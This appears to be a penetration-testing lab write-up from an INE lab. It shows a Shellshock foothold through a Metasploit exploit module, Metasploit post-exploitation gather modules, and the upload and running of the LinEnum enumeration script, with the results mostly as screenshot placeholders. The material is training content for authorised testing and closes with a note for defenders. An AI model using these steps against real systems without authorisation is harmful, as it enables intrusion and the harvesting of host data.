---
title: "Automating Linux Local Enumeration"
description: "Automating Linux post-exploitation enumeration: a Shellshock foothold, running the linux/gather/* Metasploit post modules (configs, network, system), then running the LinEnum script for a full automated report of users, jobs, network, services, software and interesting files."
date: 2025-12-08
platform: "INE Labs"
difficulty: "Medium"
tags: ["Linux", "Post-Exploitation", "Enumeration", "Shellshock", "LinEnum", "Metasploit", "Automation"]
cover: "./photo14.png"
---

# Automating Linux Local Enumeration

**Classification:** Host & Network Penetration Testing / Post-Exploitation<br>
**Target:** Linux host (Apache CGI, Shellshock)

## 1. Executive Summary

We automate Linux post-exploitation enumeration. After a **Shellshock** foothold
(`apache_mod_cgi_bash_env_exec`), we run the `linux/gather/*` Metasploit post modules
(configs, network, system info — stored in loot), then upload and run the **LinEnum** script
for a comprehensive automated report covering users, jobs, network, services, software and
interesting files.

## 2. Foothold (Shellshock)

```bash
db_nmap -sV <target>
```

![Nmap scan](./photo1.png)

![Web content on port 80](./photo2.png)

The page uses a CGI timer script.

![Page source — CGI (1)](./photo3.png)

![CGI script (2)](./photo4.png)

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set TARGETURI /cgi-bin/<script>.cgi
exploit
```

![Shellshock — Meterpreter session](./photo5.png)

## 3. Metasploit Post Modules

```bash
run post/linux/gather/enum_configs
```

![enum_configs (1)](./photo6.png)

![enum_configs (2)](./photo7.png)

```bash
run post/linux/gather/enum_network
```

![enum_network](./photo8.png)

![DNS configuration](./photo9.png)

```bash
run post/linux/gather/enum_system
```

![enum_system](./photo10.png)

## 4. LinEnum

Moving to a temp directory and uploading the LinEnum script.

![cd temp](./photo11.png)

![Uploading LinEnum](./photo12.png)

```bash
chmod +x LinEnum.sh
./LinEnum.sh
```

![Running LinEnum](./photo13.png)

### System

![System information](./photo14.png)

### Users & Groups

![User/Group information (1)](./photo15.png)

![User/Group information (2)](./photo16.png)

![User/Group information (3)](./photo17.png)

### Environment

![Environment (1)](./photo18.png)

![Environment (2)](./photo19.png)

### Jobs / Tasks

![Jobs/Tasks (1)](./photo20.png)

![Jobs/Tasks (2)](./photo21.png)

![Jobs/Tasks (3)](./photo22.png)

### Network

![Network (1)](./photo23.png)

![Network (2)](./photo24.png)

### Services

![Services (1)](./photo25.png)

![Services (2)](./photo26.png)

![Services (3)](./photo27.png)

![Services (4)](./photo28.png)

### Software

![Software](./photo29.png)

### Interesting Files

![Interesting files (1)](./photo30.png)

![Interesting files (2)](./photo31.png)

![Interesting files (3)](./photo32.png)

### Docker Check

![Docker check / finish](./photo33.png)

## 5. Notes

LinEnum (and LinPEAS) automate what would otherwise be dozens of manual commands, quickly
surfacing privesc paths (SUID files, writable configs, cron jobs). The trade-off is noise —
defenders should monitor for script execution and mass enumeration.
